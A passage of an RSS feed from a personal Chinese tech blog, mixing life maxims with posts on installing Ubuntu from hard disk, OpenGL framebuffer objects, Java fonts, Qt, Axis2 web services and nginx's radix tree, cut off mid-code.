你有你的生命观，我有我的生命观，我不干涉你。只要我能，我就感化你。如果不能，那我就认命。<br>61. 你希望掌握永恒，那你必须控制现在。<br>62. 恶口永远不要出自于我们的口中，不管他有多坏，有多恶。你愈骂他，你的心就被污染了，你要想，他就是你的善知识。<br>63. 别人可以违背因果，别人可以害我们，打我们，毁谤我们。可是我们不能因此而憎恨别人，为什么？我们一定要保有一颗完整的本性和一颗清净的心。<br>64. 如果一个人没有苦难的感受，就不容易对他人给予同情。你要学救苦救难的精神，就得先受苦受难。<br>65. 世界原本就不是属于你，因此你用不着抛弃，要抛弃的是一切的执著。万物皆为我所用，但非我所属。<br>66. 虽然我们不能改变周遭的世界，我们就只好改变自己，用慈悲心和智慧心来面对这一切]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720095812355326/</guid>
    </item>
    <item>
      <title>
<![CDATA[硬盘安装Ubuntu]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201042311262921/</link>
      <description>
<![CDATA[使用Ubuntu 10.04的desktop版，分三步<br>1。将iso文件放入C盘根目录，从iso的casper文件夹里抽取vmlinuz initrd.lz，放入C盘根目录<br>2。从grub启动<br>root (hd0,1)<br>kernel /vmlinuz iso-scan/filename=ubuntu.iso ro quiet<br>initrd /initrd.lz<br>boot<br>3。进入桌面后，打开终端，执行 sudo umount -l /isodevice]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201042311262921/</guid>
    </item>
    <item>
      <title>
<![CDATA[OpenGL中使用FBO]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720103892121336/</link>
      <description>
<![CDATA[1. 什么是FBO<br>帧缓冲是显卡内存中的一块，保存在该内存区块中的图像数据会<span style="font-weight: bold;">实时</span>地在显示器上显示出来，帧缓存中的数据最大最小值会被限定在一个范围内，也就是 [0/255; 255/255]<br><br>有一个叫 EXT_framebuffer_object 的OpenGL的扩展， 允许我们把一个<span style="font-weight: bold;">离屏缓冲区</span>作为我们渲染运算的目标。我们通常把这一技术叫<span style="font-weight: bold;">FBO</span>，也就是 <span style="font-weight: bold;">Frame Buffer Object</span>的缩写。<br><br>要使用一个离屏缓冲区作我们的渲染运算区，只要很少的几行代码便可以实现了。当使用数字0来绑定一个FBO的时候，它会还原window系统的特殊帧缓冲区。因此可以用FBO实现在GPU上进行运算<br><br>2. FBO用法<br>分三步： 创建，使用，停止<br>创建：glGenFrameBuffersEXT, glBindFrameBuffersEXT, 绑定纹理<br>使用：glFrameBufferTexutre2DEXT(), glFrameBuffer2DEXT(...,0)<br>停止：glDeleteFrameBufferEXT<br><br>3. 示例（来自http://blog.chinaunix.net/u/15845/showart_315485.html)<br>/**<br>使用GPU的计算<br>1. 使用glTexSubImage2D将数据放到GPU的纹理内存里<br>2. 使用绘制将运算结果放到FBO里<br>3. 使用glReadPixels将结果读出到CPU里<br>*/<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;GL/glew.h&gt;<br>#include &lt;GL/glut.h&gt;<br><br>int main(int argc, char **argv) {<br>&nbsp;&nbsp;&nbsp; // 这里声明纹理的大小为：teSize;而数组的大小就必须是texSize*texSize*4<br>&nbsp;&nbsp;&nbsp; int texSize = 2;<br>&nbsp;&nbsp;&nbsp; int i;<br><br>&nbsp;&nbsp;&nbsp; // 生成测试数组的数据<br>&nbsp;&nbsp;&nbsp; float* da<wbr>ta = (float*)malloc(4*texSize*texSize*sizeof(float));<br>&nbsp;&nbsp;&nbsp; float* result = (float*)malloc(4*texSize*texSize*sizeof(float));<br>&nbsp;&nbsp;&nbsp; for (i=0; i&lt;texSize*texSize*4; i++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; da<wbr>ta[i] = (i+1.0)*0.01F;<br><br>&nbsp;&nbsp;&nbsp; // 初始化OpenGL的环境<br>&nbsp;&nbsp;&nbsp; glutInit (&amp;argc, argv);<br>&nbsp;&nbsp;&nbsp; glutCreateWindow("TEST1");<br>&nbsp;&nbsp;&nbsp; glewInit();//使用了OpenGL扩展，所以必须glewInit<br>&nbsp;&nbsp;&nbsp; // 视口的比例是 1:1 pixel=texel=da<wbr>ta 使得三者一一对应<br>&nbsp;&nbsp;&nbsp; glMatrixMode(GL_PROJECTION);<br>&nbsp;&nbsp;&nbsp; glLoadIdentity();<br>&nbsp;&nbsp;&nbsp; // glFrustum(-1,1,-1,1,1,-1);//测试变换<br>&nbsp;&nbsp;&nbsp; gluOrtho2D(0.0,texSize,0.0,texSize);<br>&nbsp;&nbsp;&nbsp; glMatrixMode(GL_MODELVIEW);<br>&nbsp;&nbsp;&nbsp; glLoadIdentity();<br>&nbsp;&nbsp;&nbsp; glViewport(0,0,texSize,texSize);<br><br>&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; // 生成并绑定FBO，也就是生成一个离屏渲染对像<br>&nbsp;&nbsp;&nbsp; GLuint fb;<br>&nbsp;&nbsp;&nbsp; glGenFramebuffersEXT(1,&amp;fb); <br>&nbsp;&nbsp;&nbsp; glBindFramebufferEXT(GL_FRAMEBUFFER_EXT,fb);<br>&nbsp;&nbsp;&nbsp; // 生成两个纹理，一个(tex)是&lt;b&gt;输入&lt;/b&gt;的纹理，一个(fboTex)是&lt;b&gt;运算结果&lt;/b&gt;的纹理<br>&nbsp;&nbsp;&nbsp; GLuint tex,fboTex;<br>&nbsp;&nbsp;&nbsp; glGenTextures (1, &amp;tex);<br>&nbsp;&nbsp;&nbsp; glGenTextures (1, &amp;fboTex);<br><br>&nbsp;&nbsp;&nbsp; //设置运算结果fboTex<br>&nbsp;&nbsp;&nbsp; glBindTexture(GL_TEXTURE_RECTANGLE_ARB,fboTex);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_RECTANGLE_ARB, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_TEXTURE_MIN_FILTER, GL_NEAREST);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_RECTANGLE_ARB, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_TEXTURE_MAG_FILTER, GL_NEAREST);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_RECTANGLE_ARB, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_TEXTURE_WRAP_S, GL_CLAMP);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_RECTANGLE_ARB, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_TEXTURE_WRAP_T, GL_CLAMP);<br>&nbsp;&nbsp;&nbsp; glTexImage2D(GL_TEXTURE_RECTANGLE_ARB,0,GL_RGBA32F_ARB,//申请内存<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; texSize,texSize,0,GL_RGBA,GL_FLOAT,0);<br><br>&nbsp;&nbsp;&nbsp; //设置输入tex<br>&nbsp;&nbsp;&nbsp; glBindTexture(GL_TEXTURE_RECTANGLE_ARB,tex);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_RECTANGLE_ARB, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_TEXTURE_MIN_FILTER, GL_NEAREST);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_RECTANGLE_ARB, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_TEXTURE_MAG_FILTER, GL_NEAREST);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_RECTANGLE_ARB, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_TEXTURE_WRAP_S, GL_CLAMP);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_RECTANGLE_ARB, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_TEXTURE_WRAP_T, GL_CLAMP);<br>&nbsp;&nbsp;&nbsp; glTexEnvf(GL_TEXTURE_ENV,GL_TEXTURE_ENV_COLOR,GL_DECAL);<br>&nbsp;&nbsp;&nbsp; glTexImage2D(GL_TEXTURE_RECTANGLE_ARB,0,GL_RGBA32F_ARB,//申请内存<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; texSize,texSize,0,GL_RGBA,GL_FLOAT,0);<br><br>&nbsp;&nbsp;&nbsp; //绑定FBO与运算结果，开始计算<br>&nbsp;&nbsp;&nbsp; glFramebufferTexture2DEXT(GL_FRAMEBUFFER_EXT, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_COLOR_ATTACHMENT0_EXT, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_TEXTURE_RECTANGLE_ARB,fboTex,0);<br><br>&nbsp;&nbsp;&nbsp; //Step1. 将输入存入显卡<br>&nbsp;&nbsp;&nbsp; glBindTexture(GL_TEXTURE_RECTANGLE_ARB,tex);<br>&nbsp;&nbsp;&nbsp; glTexSubImage2D(GL_TEXTURE_RECTANGLE_ARB,0,0,0,texSize,texSize,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_RGBA,GL_FLOAT,da<wbr>ta);<br><br><br>&nbsp;&nbsp;&nbsp; //--------------------begin-------------------------<br>&nbsp;&nbsp;&nbsp; //以下代码是渲染一个大小为texSize * texSize矩形，<br>&nbsp;&nbsp;&nbsp; //其作用就是把纹理中的数据，经过处理后，保存到帧缓冲中去，<br>&nbsp;&nbsp;&nbsp; //由于用到了离屏渲染，这里的帧缓冲区指的就是FBO纹理。<br>&nbsp;&nbsp;&nbsp; //在这里，只是简单地把数据从纹理直接传送到帧缓冲中，<br>&nbsp;&nbsp;&nbsp; //没有对这些流过GPU的数据作任何处理，但是如果我们会用CG、<br>&nbsp;&nbsp;&nbsp; //GLSL等高级着色语言，对显卡进行编程，便可以在GPU中<br>&nbsp;&nbsp;&nbsp; //截获这些数据，并对它们进行任何我们所想要的复杂运算。<br>&nbsp;&nbsp;&nbsp; //这就是GPGPU技术的精髓所在。<br>&nbsp;&nbsp;&nbsp; //Step2 GPU-&gt;FBO, 运算应该发生在这里, 可以Enable Cg的Pro<wbr>file，实现运算<br>&nbsp;&nbsp;&nbsp; glBindTexture(GL_TEXTURE_RECTANGLE_ARB,tex);<br>&nbsp;&nbsp;&nbsp; glEnable(GL_TEXTURE_RECTANGLE_ARB);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glBegin(GL_QUADS);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glTexCoord2f(0.0, 0.0); <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glVertex2f(0.0, 0.0);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glTexCoord2f(texSize, 0.0); <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glVertex2f(texSize, 0.0);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glTexCoord2f(texSize, texSize); <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glVertex2f(texSize, texSize);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glTexCoord2f(0.0, texSize); <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glVertex2f(0.0, texSize);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glEnd();<br><br>&nbsp;&nbsp;&nbsp; //--------------------end------------------------<br><br>&nbsp;&nbsp;&nbsp; //Step3 从显卡的FBO将数据读出到CPU<br>&nbsp;&nbsp;&nbsp; glReadBuffer(GL_COLOR_ATTACHMENT0_EXT);<br>&nbsp;&nbsp;&nbsp; glReadPixels(0, 0, texSize, texSize,GL_RGBA,GL_FLOAT,result);<br><br>&nbsp;&nbsp;&nbsp; //打印输出结果<br>&nbsp;&nbsp;&nbsp; printf("Da<wbr>ta before roundtrip:\n");<br><br>&nbsp;&nbsp;&nbsp; for (i=0; i&lt;texSize*texSize*4; i++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("%f\n",da<wbr>ta[i]);<br>&nbsp;&nbsp;&nbsp; printf("Da<wbr>ta after roundtrip:\n");<br>&nbsp;&nbsp;&nbsp; for (i=0; i&lt;texSize*texSize*4; i++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("%f\n",result[i]);<br>&nbsp;&nbsp;&nbsp; // 释放本地内存<br>&nbsp;&nbsp;&nbsp; free(da<wbr>ta);<br>&nbsp;&nbsp;&nbsp; free(result);<br><br>&nbsp;&nbsp;&nbsp; // 释放显卡内存<br>&nbsp;&nbsp;&nbsp; glDeleteFramebuffersEXT (1,&amp;fb);<br>&nbsp;&nbsp;&nbsp; glDeleteTextures (1,&amp;tex);<br>&nbsp;&nbsp;&nbsp; glDeleteTextures(1,&amp;fboTex);<br>&nbsp;&nbsp;&nbsp; return 0;<br>}<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Graphics</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720103892121336/</guid>
    </item>
    <item>
      <title>
<![CDATA[Java桌面应用的缺省字体太难看？ 使用Windows系统宋体和雅黑字体的设置方法]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200711286202261/</link>
      <description>
<![CDATA[<P>Java应用和Windows应用一眼就能看出来，因为字体往往差别很明显。不同平台发布的Java有不同的缺省字体设置，比如：IBM的缺省是宋体－方正超大字体集，字库倒是很全，但字体看起来比较简陋（锯齿较明显），有时候甚至影响阅读。</P>
<P>如何换成Windows系统缺省的宋体字<BR>1.4以前版本：<BR>1 找到JAVAHOME/lib/font/下的font.properties.zh文件：<BR>比如： C:\Program Files\IBM\Java142\jre\lib 下：<BR>2 搜索 Simsun (Founder Extended)替换成Simsun即可；</P>
<P>Java 5以上版本：<BR>1 将 %JAVAHOME%\lib\fontconfig.properties.src 命名为 %JAVAHOME%\lib\fontconfig.properties； <BR>比如： C:\Program Files\Java\jre1.6.0_03\lib下的fontconfig.properties<BR>2 将 %JAVAHOME%\lib\fontconfig.properties文件中的 "allfonts.chinese-gb18030属性更改为 "allfonts.chinese-gb18030=SimSun"；</P>
<P>&nbsp;</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200711286202261/</guid>
    </item>
    <item>
      <title>
<![CDATA[Qt必知必会]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009101611840975/</link>
      <description>
<![CDATA[读音：cute[kju:t] cute的意思是漂亮的、精巧的。一起尽在不言中<br><br>授权：Qt的授权一直是颇有争议的，以前只有GPL和Commercial两种，言下之意是：要么开源，要么交钱。令人欣慰的是自Qt4.5起，加入了LGPL。可以类库引用的方式来既不交钱也不开源，当然前提是要用4.5和4.5以后的Qt版本。<br><br>跨平台：Windows、Linux、Mac、手机。。。很好很强大<br><br>跨语言：个人用过C++和Python写Qt程序。不但跨语言，而且跨的很好，《Linux窗口程序设计/精彩实例分析》里的都是C++的程序，换成Python语言轻而易举。<br><br>相似性：和MFC有几分相似，布局方面和java awt有几分相似。上手还是颇容易的。<br><br>关键点：<br>信号槽机制：若用过MFC，应该比较容易理解<br>元对象系统：。。。，学习ing<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009101611840975/</guid>
    </item>
    <item>
      <title>
<![CDATA[成都熬通宵]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200773113552872/</link>
      <description>
<![CDATA[<P>心情很不爽，</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200773113552872/</guid>
    </item>
    <item>
      <title>
<![CDATA[使用Eclipse+MyEclipse+AXIS开发WebService]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720078710032719/</link>
      <description>
<![CDATA[<DIV><FONT face="Verdana" ><FONT size="2" >所需工具</FONT></FONT></DIV>  <DIV><FONT face="Verdana" ><FONT size="2" >1。Eclipse3.2</FONT></FONT></DIV>  <DIV><FONT face="Verdana" ><FONT size="2" >2。MyEclipse5.0</FONT></FONT></DIV>  <DIV><FONT face="Verdana" ><FONT size="2" >3。Eclipse-Plugin：AXIS_Coder_Generator</FONT></FONT></DIV>  <DIV><FONT face="Verdana" ><FONT size="2" >4。Eclipse-Plugin：AXIS_Service_Archiver</FONT></FONT></DIV>  <DIV><FONT face="Verdana" size="2" >5。Tomcat</FONT></DIV>  <DIV><FONT face="Verdana" ><FONT size="2" >6。AXIS.war</FONT></FONT></DIV>  <DIV><FONT face="Verdana" ><FONT size="2" >步骤：</FONT></FONT></DIV>  <DIV><FONT face="Verdana" ><FONT size="2" >1。首先安装两个插件到Eclipse中，并把Axis2.war部署到Tomcat中</FONT></FONT></DIV>  <DIV><FONT face="Verdana" ><FONT size="2" >2。Eclipse新建Web Project</FONT></FONT></DIV>  <DIV><FONT face="Verdana" ><FONT size="2" >3。新建MyEclipse-&gt;WebServices-&gt;WSDL，在src目录下建立SayHello.wsdl</FONT></FONT></DIV>  <DIV><FONT face="Verdana" ><FONT size="2" >4。修改新创建的SayHello.wsdl方法名为SayHello，Input为SayHelloRequest，Output为SayHelloResponse</FONT></FONT></DIV>  <DIV><FONT face="Verdana" ><FONT size="2" >5。产生Java代码New-&gt;Axis2Wizards-&gt;Axis Code Generator, Sync Style Only，然后修改BusinessLogic。</FONT></FONT></DIV>  <DIV>&nbsp;&nbsp;&nbsp; try{<BR>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;SayHelloResponse response = new SayHelloResponse();<BR>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;response.setSayHelloResponse("Hi, "+request.getSayHelloRequest()+". How are you?");<BR>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;return response;<BR>&nbsp;&nbsp;&nbsp; &nbsp;}<BR>&nbsp;&nbsp;&nbsp; &nbsp;catch(UnsupportedOperationException e){<BR>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;throw e;<BR>&nbsp;&nbsp;&nbsp; &nbsp;}</DIV>  <DIV><FONT face="Verdana" ><FONT size="2" >6。加入axis2.war的WEB-INF/lib目录下的jar，然后加入JUnit1.3.8支持</FONT></FONT></DIV>  <DIV><FONT face="Verdana" ><FONT size="2" >7。修改src包名，修改TestCase的包</FONT></FONT></DIV>  <DIV><FONT face="Verdana" ><FONT size="2" >8。New-&gt;Axis2Wizards-&gt;Axis Service Archiver，产生一个hjz.jar文件</FONT></FONT></DIV>  <DIV><FONT face="Verdana" ><FONT size="2" >9。把hjz.jar文件拷贝到axis2.war的 WEB-INF/services目录下，然后就可以看到</FONT></FONT></DIV>  <DIV><FONT face="Verdana" ><FONT size="2" >10。用JUnit测试</FONT></FONT></DIV>  <DIV>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; String url = "<A rel="nofollow" href="http://localhost/axis2/services/SayHello"  >http://localhost/axis2/services/SayHello</A>";<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; net.vicp.hankjin.sayhello.SayHelloStub stub = new net.vicp.hankjin.sayhello.SayHelloStub(url); //the default implementation should point to the right endpoint</DIV>  <DIV>&nbsp;</DIV>  <DIV>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; net.vicp.hankjin.sayhello.SayHelloRequest request = (net.vicp.hankjin.sayhello.SayHelloRequest) getTestObject(net.vicp.hankjin.sayhello.SayHelloRequest.class);</DIV>  <DIV>&nbsp;</DIV>  <DIV>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; request.setSayHelloRequest("Hankjin");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println(stub.SayHello(request).getSayHelloResponse());<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // todo Fill in the param14 here<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; assertNotNull(stub.SayHello(request));</DIV>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720078710032719/</guid>
    </item>
    <item>
      <title>
<![CDATA[自动调整ER图]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372011050275659/</link>
      <description>
<![CDATA[<div>jbpm3.2.3版本生成的数据库有28张表，用MySQL Workbench生成的ER图如下所示：<br>非常混乱的感觉，有什么算法可以自动地调整这张图，让它尽可能少得交叉呢？<br><img title="自动调整ER图 - hankjin - 云水居" alt="自动调整ER图 - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img858.ph.126.net/XN3ccjFB3oAk_zbDBP6YZg==/673569619270061386.png"></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Todo</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372011050275659/</guid>
    </item>
    <item>
      <title>
<![CDATA[nginx的数据结构(4) 基树ngx_radix_tree]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010912104443939/</link>
      <description>
<![CDATA[基树一种不太常用的数据结构，是Linux文件系统的一种存储方式。<br>nginx 的数据结构基树 ngx_radix_tree 是一个较少使用的结构，只在http_module中使用了一次。<br>core/ngx_radix_tree.h文件中<br>基树<br>typedef struct {<br>&nbsp;&nbsp;&nbsp; ngx_radix_node_t&nbsp; *root;<br>&nbsp;&nbsp;&nbsp; ngx_pool_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *pool;<br>&nbsp;&nbsp;&nbsp; ngx_radix_node_t&nbsp; *free;<br>&nbsp;&nbsp;&nbsp; char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *start;<br>&nbsp;&nbsp;&nbsp; size_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; size;<br>} ngx_radix_tree_t;<br>基树节点：<br>struct ngx_radix_node_s {<br>&nbsp;&nbsp;&nbsp; ngx_radix_node_t&nbsp; *right;<br>&nbsp;&nbsp;&nbsp; ngx_radix_node_t&nbsp; *left;<br>&nbsp;&nbsp;&nbsp; ngx_radix_node_t&nbsp; *parent;<br>&nbsp;&nbsp;&nbsp; uintptr_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; value;<br>};<br><div><img title="nginx的数据结构(4) 基树ngx_radix_tree - hankjin - 云水居" alt="nginx的数据结构(4) 基树ngx_radix_tree - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img.ph.126.net/FLqCyyQBBkVoy4JuYfTIIQ==/3314649325746242551.png"></div>&nbsp;如果所示：树结构主要包含三个指针：<br>root：树的根结点<br>free：空闲的结点链表<br>start：空闲的内存块<br>每个使用中的节点使用parent, left, right指针相互连接，空闲的结点通过right指针连成一个链表。<br><br>nginx 的基树只有两个子节点，从二进制最高位开始，如果该位是0，则进入左子树，如果该位是0，则进入右子树。结尾的连续的0忽略掉。<br>例如<br>key=00100000 00000000 00000000 00000000 则节点=root-&gt;2 left&gt;right<br>key=10100000 00000000 00000000 00000000 则节点=root-&gt;right-&gt;left-&gt;right<br>key=00100000 00000000 00000000 00000001 则节点=root-&gt;2 left-&gt;right-&gt;28left-&gt;right<br>key=10000000 00000000 00000000 00000000 则节点=root-&gt;right<br>注: root-&gt;2 left-&gt;right 表示 root-&gt;left-&gt;left-&gt;right 2表示连续两个-&gt;left<br><br><b>创建基树：</b><br>1。申请树结构<br>2。申请root节点<br>3。预申请一些节点，并加入树<br>代码见core/ngx_radix_tree.c<br>tree = ngx_palloc(pool, sizeof(ngx_radix_tree_t));&nbsp;&nbsp; //申请树结构内存，如上图所示的最上一层<br>tree-&gt;root = ngx_radix_alloc(tree);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //申请root节点结构<br>//Intel x86默认创建七层树结点<br>while (preallocate--)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //预申请空间并创建若干层的树结点。<br>&nbsp;&nbsp;&nbsp; ngx_radix32tree_insert(tree, key, mask, NGX_RADIX_NO_VALUE)<br><b>基树的内存管理</b><br>基树的内存管理主要通过三个指针实现，root,free和start<br>root表示当前树的根结点，是使用中的结点。<br>free则是表示当前树的空闲结点，当一个树结点被 删除时，nginx 并没有将内存归还系统或pool，而是加入自己的free链表中，以供下次使用。<br>start是从内存池中申请的空闲内存，当free链表中的结点用完时，则从start指向的内存块中取一块，然后向后移动start指针，将修改size的值。如果start指向的内存不也不足了，则向内存池pool申请一块内存。<br>代码如下：<br>core/ngx_radix_tree.c<br>ngx_radix_alloc(ngx_radix_tree_t *tree){<br>&nbsp;&nbsp;&nbsp; if (tree-&gt;free) {//free链表中有空闲的节点，则从链表中取出<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p = (char *) tree-&gt;free;//取链表头的节点<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tree-&gt;free = tree-&gt;free-&gt;right;//修改链表头<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return p;//返回<br>&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; //如果free链表为空，则从start内存块中切一块出来 <br>&nbsp;&nbsp;&nbsp; if (tree-&gt;size &lt; sizeof(ngx_radix_node_t)) 